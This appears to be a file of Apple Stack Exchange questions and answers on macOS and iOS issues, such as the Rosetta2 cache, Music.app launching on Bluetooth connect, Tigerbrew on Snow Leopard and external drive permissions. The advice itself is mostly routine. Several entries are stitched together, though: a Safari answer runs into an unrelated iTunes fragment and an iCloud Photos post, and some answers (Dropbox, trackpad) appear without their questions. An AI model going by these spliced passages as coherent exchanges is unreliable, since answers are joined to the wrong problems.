/var/db/oah.\nOn an M1-based CI instance where we are testing per-commit-novel x86_64 binaries under Rosetta2, this directory seems to grow without bound and eventually ends up consuming all free disk space on the machine. Currently /var/db/oah is approximately 800GB and contains about 2.4 million directories.\nI would have hoped that such a cache would have a size limit and built-in LRU behavior, or at least some sort of administrative command to prune it (perhaps based on atime?) that could be scheduled, but so far I've been unable to find any setting to configure such a bound for the cache or any command to interact with it at all, let alone clean it out. Ideally, we would like to not inhibit caching or remove recently used translations since we do expect that caching will offer a performance benefit when the same binary is re-used, which does happen in our testing environment.\nIs anyone aware of any tooling or system configuration settings that may allow us to bound the size of the oah cache for Rosetta2, or manually prune it, or if necessary disable caching entirely?\n\nA: Unfortunately I don't think Apple ships any configuration options or tooling to allow the user to bound the size of the Rosetta2 cache - nor tools for pruning it or similar.\nFor this particular usecase with a CI server, I would probably suggest making a small addition to your CI build script that removes its additions to the Rosetta2 cache.\nIn particular, every time you build a new executable and run it for the first time using Rosetta2, a new .aot file will appear in /var/db/oah. After you have finished using the build product, you could simply have the build script remove that file.\nYou can find the name of the file by tracing the program the first time you run it, which will reveal the name of the cache file. Another alternative is to set the environment variable ROSETTA_PRINT_SEGMENTS before running the program. This will output the name of the .aot file to stderr when running the program (usually you'll see multiple .aot files because dependencies are loaded in, but the principle is the same).\n", "Q: Can I Format/Erase This Disk? I purchased an iMac (Catalina) from a guy on FB a few months ago and I recently found some of his old files on an internal Crucial 250GB SSD. I got in touch with him and asked if he needed any of them and he doesn't.\nHow do I know if I can reformat/erase the drive so that I can make use of all the space available on it?\nI can't tell if there are some system files on there or something that will make the Mac crap the bed and cause me a big headache.\nHere are some links to show the architecture of the drive in Disk Utility as well as a look at the drive from Finder.\nThis is the hierarchy in disk utility:\n\nThis is the FIRST instance of CRUCIAL in Disk Utility, as seen in the Finder:\n\nThis is Untitled2 in the Finder:\n\nThis is the SECOND instance of CRUCIAL in Disk Utility, as seen in Finder, and the one that worries me because of all the folders and such:\n\nAnd this is Update in the Finder:\n\nUltimately, I'd like to find out if I can erase the Crucial SSD drive so that I can use it without messing anything up. Any help would be appreciated.\nThanks!\n\nA: From your comment, it looks like you've got 2 SSDs in the iMac, an Apple 128GB and a Crucial 256GB. Based on your Finder screenshot, they both appear a bit messed up (it shouldn't show the \"- Data\" part).\nI'd recommend restarting into Recovery (based on which OS you want to install, there are a few options: https://support.apple.com/guide/mac-help/use-macos-recovery-on-an-intel-based-mac-mchl338cf9a8/mac). Once you're in Recovery mode, I'd open Disk Utility and fully erase both drives (ensure \"Show All Disks\" is enabled in the View menu and erase the \"Apple SSD...\" and \"Crucial_...\" drives). Make sure to format them with GUID partition maps and APFS (unless you've chosen to install the iMac's original OS, in which case it may need HFS+). Then, back out of Disk Utility and reinstall macOS to whichever drive you want.\nNote: It may be possible to open the iMac up and install a different drive in the drive slot, as it appears the previous owner had done (installing a second SSD).\n", "Q: Spacing error in Terminal \nNotice the nonexistent space displayed in the first output.  I've sent this to Apple as a bug, but is there anything the user (or admin) can do to fix it?  Locale is en_US.UTF-8\nThe worst part of the bug is that it screws up command-recall-and-edit.  Any non-ASCII character in the command has a bogus space displayed after it.  But the space is counted when the cursor passes it, resulting in the edit position not being where the cursor is.\nIf I copy a line with such a bogus space and paste it in TextEdit, the space goes away.  So I don't think it's a bug in the shell.  Also, it happened in both bash and zsh.\n\nA: \"nohillside\" asked which encoding I had in the preferences.  That was not the problem, but it showed me part of the problem.\nImmediately below that preference is a checkbox for “Unicode East Asian Ambiguous characters are wide.”  That label is misleading—if checked, all non-ASCII characters are wide (not merely East Asian Ambiguous).\nThe other part of the problem is that \"wide\" means that it adds a space to the output and the edit cursor movements count characters displayed while the edit position counts the actual characters.\nI turned off that option (which I actually see no value in) and the bogus spaces are gone.\n", "Q: How do I stop this malware from opening up everytime I wear my Bluetooth headphone? I have Sony Bluetooth headphone that has wear detection, which automatically pauses any audio/video playing whenever I temporarily take my headphone off and restart playing as soon as I start wearing it again. Nice.\nProblem is, every time it does that, this piece of malware shows up on the screen:\n\nI don't use this app, I can't uninstall or disable it, I don't have an Apple account, and I don't want it at all, I wasn't able to find a setting to turn this unwanted behavior off.\n\nA: The only way I know that you can stop it is to use a different app to listen to your music.  Might have a nice fringe benefit of lowering your blood pressure.\n", "Q: Does the preference in Messages > \"Keep messages\" affect whats stored in iCloud or only whats local on the Mac In the macOS messages app, there is an option called \"Keep messages\" that allows you to change the duration for which messages are kept.\n\nWhat is unclear to me is: does this affect my messages stored in iCloud as well or just the local copies on my Mac?\nI'd like them to stay in the cloud but not my Mac so as to not fill up my MBP's tiny 124 GB HD.\nI see the option is also there in the iOS Messages settings. Is the choice synced across devices or again does this only affect local device storage and not iCloud.\n\n\nA: I just had an Apple case with this. Basically, that message that says it will delete it from that device is true, but it will also delete it from iCloud. So if another device like your phone is set to keep messages forever, it won't remove them from your phone, but the sync with iCloud will only go back 30 days.\n\nA: The setting applies to iCloud, so it affects messages on all devices.  If you change the setting on one device, it will also update on the other as well.\nThere is not an option in this case to only keep 30 days on one device, but keep a whole year on another (as an example).\n", "Q: MacBook Pro (16-inch, 2019) hot & noisy fan when second monitor plugged via USB-C I have a problem in over heating and noisy fan when I have the second monitor plugged via USB-C (I have tried different types of external monitor, and the problem does happen with every monitor).\nI can measure the Fan speed via istats:\n$ istats\n--- CPU Stats ---\nCPU temp:               58.38°C     ▁▂▃▅▆▇\n\n--- Fan Stats ---\nTotal fans in system:   2\nFan 0 speed:            5389 RPM    ▁▂▃▅▆▇\nFan 1 speed:            4927 RPM    ▁▂▃▅▆▇\n\nI'm quite sure that the problem is caused by the second graphics card (AMD Radeon Pro 5300M 4 GB).\nI have two questions:\n\n*\n\n*How can I measure the graphics card temperature to be sure that the problem is caused by the graphic card?\n\n*How can I resolve the problem?\n\n\nA: You can use macs fan control to get a menu bar indicator of any temp sensor you like as well as the fan’s RPM. This utility can also be used to set a more aggressive fan curve based on your GPU’s temp, but it’s a good rule to never set it to less or to a low constant value. This can cause random thermal shutdowns and sometimes damage.\nI am not sure about resolving the problem. Unfortunately, the macs fan curve is already pretty silent, so if it’s ramping up, you have a lot of heat. You may need to use a utility like RDM to change your monitor's resolution to non-retina (change the resolution from the lightning bolt to the same resolution with no lightning bolt, disabling retina while keeping the scaling the same). This will reduce the load of your GPU by a considerable amount (for example, 1080p uses only 1/4 of the power of 4k). This comes with the drawback of blurrier text, so if you try this route and like it, make sure to enable sub pixel antialiasing (via terminal) for crisper text.\n\nA: I had the same problem. I cleaned all the cable connectors and thunderbolt ports and experimented with using different ports and it solved the problem completely. Others mention using a port on the right for charging and/or checking if one of the ports feels hotter than the others to determine where the problematic one is. Not sure but I settled for charging cable on the right as well.\n", "Q: iPhone 11 - Dictation commands for navigation and editing? Due to an injury in my shoulder, I'm relying more and more on iPhone dictation to write emails and WhatsApp messages. It works like a charm when my words are understood correctly; however, I have been unable to find commands to navigate, corrected misspelled/misunderstood words, and edit partially written messages.\nAre there commands for this? Or is there a way to program them? I don't need very specialized functions. Just navigation and editing.\n\nA: Some tips that should help...\nFor navigation, you should be able to \"Hey Siri, navigate to 123 Main St\" and maps will open and navigation will start.\nCorrecting misspelled words, if you double tap on a word, it will get highlighted.  There should then be a mic icon on the keyboard at the bottom.  Clicking on that icon will allow you to say the word again, or replace it with something else, etc.\nAbove all assuming of course you have some control even with the bad shoulder!\n", "Q: Safari 15.0 on the Mac keeps on reopening closed windows I'm running the new Safari 15 on MacOS 11.6 (Big Sur) and when I close the software and reopen it, the windows I've closed in the prior session reopen unlike before I upgraded Safari to the latest release.\nI've tried emptying the caches. There's over 50GB of storage space. The system has plenty of unused RAM. Safari hung the first time I tried opening it after the upgrade.\n\nA: You can set or change this behaviour in Safari Preferences (\"General\" tab, the option right below setting Safari as the standard browser). But apparently you can't really stop it.\n\nA: This behavior was so problematic for me and my productivity that I decided to try and install Safari 15.1 beta.

I can't even access my iTunes account as I can't download the Apple app for PC. I don't understand why I can no longer download any version of the iTunes app to at least get the music back to the iPod.\n\nA: You would download the app via the Windows App store.

I have turned on iCloud Photos sync. When I remove a photo on the Mac, I can see that it’s also deleted from iCloud on the web. I would like it to disappear on my iPhone as well, but it’s still there.\nAlthough the confirmation dialog is appearing when I try to delete it, it says that the photo will be deleted from iCloud and all synced devices.\n\nA: I woke up this morning and noticed that photos were finally removed from my iPhone too.\nI think the reason why it took so long is that yesterday I'd just turned on the sync with iCloud on my iPhone and immediately started deleting some of the unsuccessful or duplicated photos on the Mac. And these deletions were not immediately applied to the iPhone because (I suppose) they were added to the end of the sync queue. Thus the photos were deleted from the iPhone only after the whole library was uploaded to the iCloud.\nSo for future reference, if anybody ever faces this scenario, keep calm and just wait - eventually your changes will be applied.\n", "Q: Messages app on MacBook Pro stopped sending messages to Android phones Both my iMac and MacBook pro no longer let me send messages from the messages app. It worked like a charm before and now I'm not allowed to.

That is the default, because Dropbox wants you to do it, which is a bad idea because it mucks with several key folders, as you have discovered.\nReally this is Dropbox's poor design and poor user experience more than your fault.\nHow to Fix It:\nIn order to 'undo it' you have to reinstall the Dropbox app, turn the feature off, and then uninstall Dropbox again.\nQuoting from https://help.dropbox.com/installs-integrations/sync-uploads/computer-backup:\n\nTurn off computer backup\nYou must have the Dropbox desktop application installed to turn off computer backup.

Center and left side work perfectly fine.\nI connected the trackpad with my iPad and there were no issues, the right side worked perfectly fine. I also found another thread on Macrumors where people were looking for a solution to the same problem and some of them had trackpad's older than 2-3 years. Mixing that with the fact that the trackpad worked properly on my iPad, I concluded that it is probably not a hardware problem and the software is causing the issue. I'm currently using Big Sur and iPad OS 15.\nI've already reset the bluetooth module, factory reset the trackpad, removed the device and reconnected it. Nothing seems to solve the problem. Is there any other solution for this?\nNote - I've asked a similar question on Superuser, after going through the guidelines of stack exchange and reading multiple answers about cross-posting. I figured this is one of those exceptions where the question is suitable to both the communities. I've added a link to that question below.\nhttps://superuser.com/q/1677848/1543655\n\nA: After struggling with this problem for about a month and being told by apple CC to visit the nearest service centre, I decided to tinker a little more with the settings and see if I can find some sort of solution. This works, but it comes at the cost of not being able to use the two swipe gesture for the notification bar.\nDisable Notification centre gesture\n\n*\n\n*Make sure the trackpad is connected to your Mac\n\n*Click on the apple logo on the top left hand side of your screen\n\n*Click on system preferences\n\n*Go to Trackpad\n\n*Go to More Gestures\n\n*Deselect Notification Centre\n\nI recommend before disabling the notification centre gesture, do the following:\nReset the macOS Bluetooth Device List and Bluetooth Controller\n\n\n*Open System Preferences and click on bluetooth, enable the option Show Bluetooth in menu bar ( If you can see the bluetooth icon in the menu bar move to step no. 1 )\n\n\n*Hold down both the Shift and Option keys and at the same time click on the Bluetooth icon in the menu bar. Once the menu is showing, release the keys.\n\n\n*From the Bluetooth menu, click on Remove All Devices\n\n\n*Hold down both the Shift and Option keys again and at the same time click on the Bluetooth icon in the menu bar.\n\n\n*From the Bluetooth menu, click on Reset the Bluetooth Module\n\n\n*Restart your Mac\n\n\n*Setup your Magic Trackpad 2 again\nNote - This will reset all connected bluetooth devices, so all connected bluetooth devices will need to be reconnected.\nIf this doesn't work then you'll probably have to keep the notification centre gesture disabled to be able to use the right side of the trackpad. Hopefully there'll be an update soon which will fix this probelm.\n", "Q: Disable Apple Music starting when Bluetooth connects I'm using macOS is 11.6 and have tried all the other ways listed from as far back as 8 years until recently.  Most of those methods don't work/options are no longer visible.\nLooked at deleting it from the Applications folder but it isn't really there (try ls /Applications/M* to see what I mean).\nI just want it to go away.  I don't use it, I don't want it, I don't need it.  Happens every time Bluetooth connects, earbuds, radio, doesn't matter.\nFound the app, can't delete it.\nsudo mv /System/Applications/Music.app/ /System/Applications/NoMusic.app\nmv: rename /System/Applications/Music.app/ to /System/Applications/NoMusic.app: Operation not permitted\n\n/System/Applications/Music.app/Contents/MacOS $ sudo mv Music NoMusic\nmv: rename Music to NoMusic: Operation not permitted\n\n/System/Applications/Music.app/Contents/MacOS $ sudo chmod -x Music\nchmod: Unable to change file mode on Music: Operation not permitted\n\n\nA: Music in macOS Big Sur resides on a cryptographically signed read-only volume and why you cannot by default delete it. With the right modifications technically it can be done, however, due to the fact and an update/upgrade of macOS will just put it back, and or breaking the seal prevents the use of FileVault, and having other options, I'm not going to get into the details of the technicality.\nIf you do not find the direct cause of the issue and are unable to fix it without some sort of an easy settings change, then I offer the following as either a temporary workaround or ongoing one until such time you find another solution to your issue.\nI've never experienced that issue, however if I did, here is what I do as a temporary/ongoing workaround...\nI'd install Hammerspoon and add the following example Lua code to its init.lua file:\nfunction applicationMusicWatcher(appName, eventType, appObject)\n    if (eventType == hs.application.watcher.launching) then\n        if (appName == \"Music\") then\n            local op, stat, typ, ec = hs.execute([[\"/usr/bin/killall\" \"Music\"]])\n            if not (ec == 0) then\n                msg = \"An error occurred terminating Music.\"\n                hs.notify.new({title=\"Hammerspoon\", informativeText=msg}):send()\n            end                     \n        end\n    end\nend\nappMusicWatcher = hs.application.watcher.new(applicationMusicWatcher)\nappMusicWatcher:start()\n\nNotes:\nThis will immediately terminate Music upon it starting to launch.\nYou may/will see the icon for Music bounce briefly in the Dock, although I would think that is better than manually having to close it each time.\nI am not affiliated with the developers of Hammerspoon, just a satisfied user of the product.\n\nA: This is unfortunately standard behavior on macOS since Catalina.\nTry running noTunes:\n\nnoTunes is a macOS application that will prevent iTunes or Apple Music\nfrom launching.\nSimply launch the noTunes app and iTunes/Music will no longer be able\nto launch. For example, when bluetooth headphones reconnect.\n\nYou might also consider filing feedback with Apple.\n", "Q: How can I persuade macOS finder to start when normal methods fail? Scenario:\n\n*\n\n*Recently re-booted macOS 11.6 (but happens from time to time over last few years). Spinning beach ball in all Finder windows.\n\n*right-click Finder icon in dock and select Relaunch. Finder windows disappear but don't reopen.\n\n*Click Finder icon in dock, and little light comes on for 0.5 sec and then turns off. No windows open.\n\n*Try command line open .. Nothing happens.\n\nWhat else can I try short of rebooting?\n\nA: Do you have a second account on the Mac? I always create one, just in case, for situations like this.\nCan you start Terminal.app?\nIf you have Remote Login enabled, you can ssh in and enter:\ndefaults delete com.apple.finder\n\nThen reboot:\nsudo shutdown -r now \n\n\nand enter your login password when prompted.\n\nA: The spinning cursor in finder is typically a timeout for local attached disks or error condition in storage. Unless you have Finder extensions that involve network (Dropbox, etc…) figuring why Finder is stuck might be key even if a clean restart gets you going again for a while.\nOpening Activity Monitor from spotlight is what I would do and look for other processes that might be stuck or indicate an issue. From there, grab a system diagnosis so you have details of what the system state was before restarting.\n\n*\n\n*https://support.apple.com/guide/activity-monitor/run-system-diagnostics-actmntr2225/mac\nDo you typically have the system running for 6 months or more between restarts? A clean start of the OS shouldn’t be considered a nuclear option for most but it would be interesting to learn how you’re set up or why this would be avoided.\n", "Q: Using Ada on macOS I have a need to do a couple of small personal projects on macOS.  I am considering updating my Ada knowledge (it has changed a bit) instead of learning Swift from the very beginning.\nMy projects do not require an IDE or GUI: text/command-line is adequate.  But I do have Xcode installed (never used).  If I use Ada (from GNAT/AdaCore), will it integrate with Xcode, or can I make it independent and just use command-line?\nQuestions and answers from earlier versions of macOS make me think the methods they suggest may have problems with Big Sur 11.6 (20G165).  Anything I need to know beyond the Linux/Windows instructions in the GNAT Readme file?\nI also have a MBP with Mojave, which I can use if GNAT has trouble with Big Sur.  But I'd prefer the newer one.\nRelated:\nhttps://stackoverflow.com/questions/4091088/cant-make-ada-work-with-xcode-3-2\nhttps://stackoverflow.com/questions/28100240/how-to-install-ada-ide-and-compiler-on-mac-osx\n\nA: There's no requirement to use Xcode as such. If you're using the GNAT Community build, you'll need to have it installed though (free download).\nYou can just use the GNAT compiler directly as you would on other systems. There's no need to actually open Xcode and use the IDE.\n\nA: XCode hasn't supported Ada in many years, but still has some vestiges which can lead to some confusion. Nowadays, your best bet is to use the following development stack for modern Ada development, which works across MacOS, Windows and Linux:\n\n*\n\n*Alire, a package, toolchain and project management utility for Ada.\n\n*VSCode, Microsoft's IDE\n\n*Ada Extension for VSCode, provides Ada language support for VSCode with syntax coloring, snippets, Intellisense, Autoformatting, etc.\n\nThere's probably other commercial solutions available, including GNATStudio, but Alire has changed the game, giving Ada the same modern and productive developer experience found in other languages.\n", "Q: Can you update an iPhone from an .ipsw without losing all settings? I want to upgrade an iPhone SE (1st gen) from iOS 14.3 to 14.8, not iOS 15.\n(Evidently, Apple added the code that allows you to stay on the iOS 14 track at a later date, as it only shows options for upgrading to iOS 15.)\nI've downloaded the correct .ipsw file and verified the sha1 checksum on theiphonewiki.com.\nWill restoring from that wipe all the settings? (apps, network, home screen layout etc. etc.) and if so, is there any way I can back the settings up first?  Remember I'm upgrading (from 14.3 to 14.8), not downgrading, should that make a difference…\n(I am currently running iTunes on macOS Mojave.)\nThanks.\n\nA: You can option-click \"Update\" instead of \"Restore\" in iTunes to update your phone instead of wiping and restoring it. The process is almost the same as an OTA update, except for that fact that you're reinstalling the entire OS from the ipsw file. No settings, documents, data, or apps are touched.\nNote: you should always have a backup. It doesn't matter if you're doing OTA updates, ipsw updates, or just going outside with your device. If you care about the data and/or settings, back it up. In fact, I'm pretty sure iTunes will automatically back up your device before applying an update.\n", "Q: How to fix SSL/HTTPS issues on my Mac Pro 1,1 running Snow Leopard 10.6.8? I have an old Mac Pro 1,1 (from 2006) that I am trying to make usable again. I can't access most websites, download updates, or do anything else that might require HTTP requests because (I'm assuming) SSL/HTTPS stuff has been updated in recent years. Since I can't install any updates (and 10.6 might be the latest I can upgrade to anyway), how can I fix my SSL/HTTPS issues?\n\nA: Step 1: Download a browser with up-to-date certificates, such as Firefox Legacy (aka Nightly) to a USB drive and copy it to the Applications folder on the old Mac. See List of web browsers, email clients, and FTP clients that run on older Macs\nStep 2: Remove old version of Homebrew if you have it installed.\nrm -rf /usr/local/Cellar /usr/local/.git && brew cleanup\n\nStep 3: Download the install script for Tigerbrew (a fork of Homebrew which supports older versions of OS X. Since curl will be too old to download this, you will have to do it manually (right-click, \"save as\" to your home directory).\nhttps://raw.github.com/mistydemeo/tigerbrew/go/install\nStep 4: Open Terminal and run the Tigerbrew installer (install is the name of the file you just downloaded):\nruby install\n\nStep 5: Add this to your ~/.bash_profile if you haven't already.\nexport PATH=/usr/local/sbin:/usr/local/bin:$PATH\n\nStep 6: After installing, run brew doctor. This will set up a few things, but also prompt you to install a few things such as:\nbrew install curl\nbrew install git\n\n\nA: As noted in comments for the browser try Firefox legacy.\nFor other software try using Macports Macports has a version for each version of OSX going back to Tiger and these have been in constant maintainence since then and are fully part of current development.\nTo install\n\n*\n\n*Make sure you have Xcode - Probably best for version 3.2 (Snow Leopard unfortunately was the OS where the latest version 4.x had to be purchased) https://guide.macports.org/#installing.xcode.snowleopard\n\n*Download the package for Snow Leopard\n\n*Install the package - double click on it in Finder\n\n*I think this will alter your ~/.bash_profile top add /opt/local/bin to your path - if not do it manually.\n\n", "Q: Was \"Find My\" removed from icloud.com? Previously on icloud.com, \"Find My\" was one of the options under the dropdown to select different apps. As of today I'm no longer seeing it there.

This brings it inline with finding items, which has never worked on iCloud.com\n", "Q: Checking detailed parameters of hardware - like RAM CAS latency In Windows one can find free apps like CPUID (CPU-Z) and others who help get a lot of information about installed hardware. I was looking for something similar for macOS, but couldn't find anything suitable or giving such a wide range of information. Of course there is System Information app, but it's not very detailed.\nIs there a program (command line tool/paid graphical application) which could give me a similar extent of information to CPU-Z?\nFor example: CAS latency and timings for RAM modules, list of supported instruction sets for the CPU, details on the discrete GPU card.\n\nA: MacCPUID can list instruction set support (as well as other details about the CPU). You can see various GPU details in System Profiler, under \"Graphics/Displays\", I'm not sure what information you're looking for exactly. As for RAM latency, you can open up the computer and check the label on the RAM stick. I'm not sure why you'd need that info, it's not like you'll be doing overclocking on a Mac.\n", "Q: Stop iPhone questions about Ask App Do Not Track Every time I install an APP on iOS 15 is get extra dialogue,\nwhere for sure I will ask App Not to Track.\nIs there way to answer it once and for all: Do Not Track me?\n\nA: Disclaimer: This knowledge is based on iOS 14.7.1, so this setting's location may be changed in iOS 15.\nTo always force apps to not track, first navigate to Settings on your mobile. Then, find and tap Privacy -> Tracking, and toggling off Allow Apps to Request to Track will do.\n", "Q: Preventing Relocated Items shortcut after every update The Problem\nMy Mac has received a new Relocated Items folder after every OS update since March 8th, 2020. This was around the time I upgraded to Big Sur I think. If I delete the shortcut, it'll just come back after the next OS update.\nI have seen several threads related to this issue, but none so far have been particularly helpful in solving the actual problem.\nMost threads say this can be simply deleted and ignored. However, I am getting this Relocated Items after every update, which seems unusual since I'm not modifying the files between each update. If I delete the shortcut or folders in the parent folder, they will just reappear after my next system update. So far I have had to live with the shortcut always being on my desktop, which is particularly unhelpful as I'm no longer checking it to see if anything actually important will go there, it is just taking up space. I just checked and I now have 20 \"Previously Relocated Items\" folders, all with the same contents.\nTherefore, I'm hoping to move beyond just ignoring the files, and instead actually resolving the underlying conflict(s) to stop this file re-creation from happening.\nThe Relocated Items\nThe folder tree inside the many Relocated Items folders all contains three files under Configuration:\n\n*\n\n*/private/etc/groups.system_default\n\n*/private/etc/paths.system_default\n\n*/private/etc/shells.system_default\n\nUsing some research from other threads, I ran a diff comparison these three files to their matching files in /etc (without .system_default). The differences vary between the files.\nGroups\nUnlike paths and shells, the groups.system_default doesn't have any changes that I recognize. That said, this is also seemingly the most common file found in Relocated Items. The only difference between the two groups files is that the /etc/groups file doesn't have the _trustd:*:282:_trustd line.\nWill adding this line into the /etc/groups file prevent this \"Relocated Item\" from happening on each update, and is it safe to do this?\nPaths and Shells\nThe paths.system_default file is the same as /etc/paths, but /etc/paths also has another directory: /Users/<username>/platform-tools. This I recognize to be the Android platform tools that I installed at one time.\nSimilarly, shells.system_default is missing the /usr/local/bin/bash line, but that line is still in /etc/paths. I do remember after an upgrade having to switch from zsh back to BASH, so this makes some sense.\nWhat I don't understand is that in both of these cases, the updated files are still in their normal locations (/etc/paths and /etc/shells), but the files in Relocated Items are missing the changes that I made. My understanding of Relocated Items is that it is a backup changes I made that were replaced by macOS, but this seems to be the other way around.\nWhat should I do in this case to prevent these two unneeded Relocated Items files? I would like to keep platform-tools in my PATH, and also to continue using BASH. Do I need to remove those changes from the /etc/paths and /etc/shells, and re-add them some other way?\n\nA: The \"Relocated Items\" folder gets created automatically with each update. It includes a short text/PDF file explaining the reasoning behind it.\nFor /etc/paths, you can create entries in /etc/paths.d to prevent overwrites. There is nothing similar for /etc/shells though (but then /etc/shells doesn't get overwritten in an upgrade).\n\nA: For my case, with my improved understanding of what is happening with these files (thanks to the other answers), the following steps seemed to resolve the conflicts:\n\n*\n\n*groups.system_default: Add in the OS-made change to /etc/groups\n\n*paths.system_default: Delete my edit made there and make the changes to the PATH in another way (either in /etc/paths.d, or using .bash_profile).\n\n*shells.system_default: Delete my edit made there. chsh will still allow you to switch the shell without having that line in /etc/shells, and in my case the shell change I had made prior was not undone by removing the line.\n\nThanks all for their guidance!\n", "Q: Can I convert a volume from journaled to non journaled without formatting it? I have an external hard drive with HFS+ journaled. I have read that for some intrinsic reason, on a Linux machine I will not be able to write on such disk (while I am already able to read from it), as long as it is \"journaled\".\nHowever, I read that the Linux system would be able to read and write on it if it was HFS+ non-journaled.\nSo, this is the motivation of the question: can I just convert the filesystem from HFS+ journaled to HFS+ non-journaled without formatting (and loosing all the data)?\n--\nAddendum: from comments I understand that I can mount the journaled volume with some special tool, from the command line, and make it writable. However the accepted answer allows the Linux system to mount the volume automatically: much better for a lazy guy like me ;)\n\nA: Yes you can with the terminal command :\ndiskutil disablejournal diskxsy\n\nwhere diskxsy is to be adapted with the correct values of your hfs external partition.\n", "Q: Accidentally removed iPhone from Finder sidebar in MacOS.

I saved data to iCloud on laptop A, then opened the document on laptop B to update a part of it (with data only available on laptop B).  After saving on laptop B, I realized that iCloud didn't give me the latest data that I had previously saved on laptop A, which was more important than what I was adding.\nSo I committed the new info to memory, and went back to laptop A, and added it to the document that needed it.\nLater (after a surprisingly long time), the app complained about a save conflict:\n\nIn this particular case I knew exactly what data was where, because I was expecting a conflict.  But normally I would not remember that, and I was surprised that I was not presented with a side-by-side comparison to enable me to choose what to keep.\nIs this screen purely a product of the app?  Or are there certain things built into an iCloud framework (iCloudKit?) that they have no control over?\nIn other words, is it possible to build an app that presents the users with the information they need to resolve document save conflicts?  Or has Apple tied our hands, and do we just have to accept their sub-optimal syncing and sub-optimal resolution tools?\n\nA: App developers do have a choice on how to handle conflicts, and could implement conflict resolution in a custom way, however the common path on MacOS is to use the standard dialog you see (which is part of NSPersistentDocument).\nSyncing will always be vulnerable to delay, even with good network connectivity, so developers are expected to cope with the consequences of delayed updates.\n", "Q: Tool to find use of keyboard shortcuts Is there a way to figure out who (if anyone) is intercepting a given keystroke sequence? I'd like an answer in general (e.g. is there a tool that will do this?). In my particular case, though, I'm pretty sure that someone is intercepting Ctrl-F1, and I'd like to know who.\n\nA: I use http://www.irradiatedsoftware.com/labs/ for this problem. https://www.ergonis.com/products/keycue/ is usefull as well\n", "Q: What are default owner and group permissions on an external volume? What are the default owner and group permissions on an external volume? This is for data only.\n\nA: For MacOS (née OS X), the default owner and group permissions on a freshly formatted external drive are (in several parlances):\n\n*\n\n*775\n\n*drwxrwxr-x\n\n*user group\n\n*whichever-user-formatted-the-external-drive staff\nFor example, I just hooked up an external drive, my username is mrcook, so the permissions shown for the drive via Terminal and the ls -pal command are:\ndrwxrwxr-x mrcook staff\nTo change permissions on an external drive with MacOS, run chmod to change the permissions like read, write, etc. Run chown to change the owner and group. Both chmod and chown can be run without using sudo if you are the administrator of your Mac.\nYou can read more about chmod and 'chown` on the extremely useful SS64 website which has a list of (most?) MacOS shell commands and their switches.\nUpdate to add information about the \"ignore ownership on this volume\" checkbox option in the Finder's Get Info\nThe \"ignore ownership on this volume\" is checked by default so \"everything just works\" as Apple likes to say. This option sets the permissions as described above. However, if you uncheck the \"ignore ownership on this volume\" option, the drive permissions change to system wheel.\nI was able to use sudo vsdbutil -c /Volumes/DiskName recommended by this Mac OS X Hints page from 2002 to check the status of the permissions on the drive. The other suggestions worked as well:\n\n*\n\n*sudo vsdbutil -a /Volumes/DiskName to check the option\n\n*sudo vsdbutil -d /Volumes/DiskName to uncheck the option\n\nYMMV though depending on the version of MacOS you are using. I highly recommend this previous question on how to change \"ignore ownership on this volume\" from the command line because the changes made via vsdbutil may not stick after mounting and remounting the drive.\n", "Q: Can I copy an iPhone to a second iPhone of mine with different SIM cards and use both? I want two iPhones with different phone numbers but the same Apple ID.\nIs there any problem copying the first via iCloud and Mac to the second and using both?\n\nA: Yes, surely you can do that.\nIn general, there's nothing hindering you from having multiple phones logged into the same Apple-ID - but with different SIM-cards and phone numbers. I.e. you do not need to copy an existing phone in order to achieve this - you can also just setup a new phone as a \"blank\" device and login to your Apple-ID.\n", "Q: What is this shortcut meant to do in the Messages app? When I use the  Opt ⌥   ↑    or  Opt ⌥   ↓   keyboard shortcut on the macOS Messages app, it places previous messages I've already sent into the typing area and cycles through them.\nI often press these keys by mistake when trying to go to the beginning or end of a line, and wonder what this is actually meant to help.\nWhat are these shortcuts meant to do?\n\nA: The shortcuts are just as you say, to cycle between prior messages sent in order to use them again.\nIs is useful?  Questionable.  But it works exactly the same way as it would using Terminal, for example, in order to access prior commands again.\n", "Q: How to copy from iCloud Photos to iCloud Drive? If I store photos in iCloud Photos, it gets stored on my Mac locally, even when I try removing the options of not storing iCloud Photos, it gets stored. I want to know if there are any ways to copy the photos from iCloud Photos to iCloud Drive.\n\n\n\nA: You’ve turned off iCloud Photos, so now all your photos from when it was enabled are stored locally. Turn it back on to use Optimise Mac Storage and reduce the space required on your Mac.\n", "Q: Take Video shortcut fails to save the video if longer than 2 minutes I've got an issue with saving a video if the video camera is started via a shortcut. The video is saved to Photos if the video is shorter than 2 minutes, but something fails to save the video if it is more than 2 minutes long. I don't know if it fails to save due to the shortcut or the video system itself.\nI created a Shortcut that runs:\n\n*\n\n*Turn Airplane Mode On\n\n*Take Video with Back Camera\n\n*Save Video to Recents\n\n*Turn Airplane Mode Off\n\nI run the shortcut and and video starts, and when I stop the video by touching the red button, the video can be saved with \"Use Video.\"\nFor videos shorter than ~ 2 minutes, the video saves to Photos. With a video longer than 2 minutes, the video won't save. Saving appears to work when touching \"Save Video\", but the error message \"There was a problem running the shortcut\" appears a few seconds later on the home screen, the video hasn't saved, and Airplane Mode has stayed on.\nThis is on an iPhone 6S with 32GB RAM and iOS 14.8.

My macbook pro mid 2015 with high sierra installed started to behave strangely.\nI can boot and login, and after less than a minute it completely freezes with the spinning wheel. Then the wheel disappears, and then the screen goes black, not the keyboard.\nTried to reinstall going to recovery mode, but it found no disk to install the system.\nTried to reset SMC but no help\nAny ideas?\n\nA: May be your internal SSD is \"broken\".\nSo, from Internet Recovery Mode, you install Mac OS X on an external drive and boot from it.\nYou can hope to recover data on the internal SSD (the ideal being to make regular backups with Time Machine).\nThen if you are lucky enough to have an unsoldered SSD, which seems to be the case with the 2015 MBP, all you have to do is replace this SSD with a new one.\nThe 2015 MBPs accept NVME SSDs (much cheaper than original Apple SSDs) with a specialized adapter.\n\nA: You can create a bootable flash drive installer for macOS. You can use it to either reinstall, or install a fresh copy of macOS.\nThe instructions to create the bootable installer can be found in the Apple support document:\n\n*\n\n*https://support.apple.com/kb/HT201372\nThe link to the official copy of macOS High Sierra installer can be found via the following Apple support document:\n\n*\n\n*https://support.apple.com/kb/HT211683\n", "Q: How do I get Disk Inventory access to the entire harddrive?

